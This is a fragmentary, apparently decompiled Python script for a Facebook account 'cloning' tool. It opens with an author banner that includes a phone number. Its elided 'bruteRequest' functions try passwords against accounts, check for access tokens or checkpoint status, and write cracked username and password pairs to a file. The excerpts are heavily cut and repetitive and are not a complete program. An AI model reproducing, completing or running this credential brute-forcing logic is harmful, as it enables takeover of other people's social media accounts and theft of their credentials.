...
# Time Succes decompile : 2021-11-20 10:32:12.253541
...
def banner():
    print("""\x1b[1;91m   ╔╗ ╔═╗╦  ╔═╗╔═╗╦ ╦
   ╠╩╗╠═╣║  ║ ║║  ╠═╣
   ╚═╝╩ ╩╩═╝╚═╝╚═╝╩ ╩    \x1b[1;92m[√] \x1b[1;91mMUBASHAR \x1b[1;92m[√]
\x1b[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
 \x1b[1;91m[•] \x1b[1;92mAuthur    :  \x1b[1;91mMubashir Baloch    
 \x1b[1;91m[•] \x1b[1;92mFacebook  :  \x1b[1;91mfb.com/MUB4SH4R  
 \x1b[1;91m[•] \x1b[1;92mWhatsapp  :  \x1b[1;91m+923470336477     
 \x1b[1;91m[•] \x1b[1;92mWarning   :  \x1b[1;91mUse free Cloning     
 \x1b[1;91m[•] \x1b[1;92mWarning   :  \x1b[1;91mNot Work Use Vp      
\x1b[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝""")
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="cp":
					print(("\r\x1b[1;92m[\x1b[1;92mCP\x1b[1;92m] %s • %s               "%(fl.get("id"),i)))
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="cp":
					...
					print(("\r\x1b[1;92m[\x1b[1;92mCP\x1b[1;92m] %s • %s • %s\x1b[0m   "%(fl.get("id"),i,str(ttl))))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
  ...
  def bruteRequest(self, username, password):
    ...
    if re.search("(EAAA)\\w+", response.text):
      ...
      if "www.facebook.com" in response.json()["error_msg"]:
        ...
        print(("\r\x1b[1;92m[\x1b[1;92mCP\x1b[1;92m] %s • %s %s               "%(username,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + "\n")
        save.close()
        return True
  ...
  def bruteRequest(self, username, password):
    ...
    if re.search("(EAAA)\\w+", response.text):
      ...
      if "www.facebook.com" in response.json()["error_msg"]:
        ...
        print(("\r\x1b[1;92m[\x1b[1;92mCP\x1b[1;92m] %s • %s • %s\x1b[1;92m   "%(username,password,ttl)))
        save = open("cp.txt", "a+")
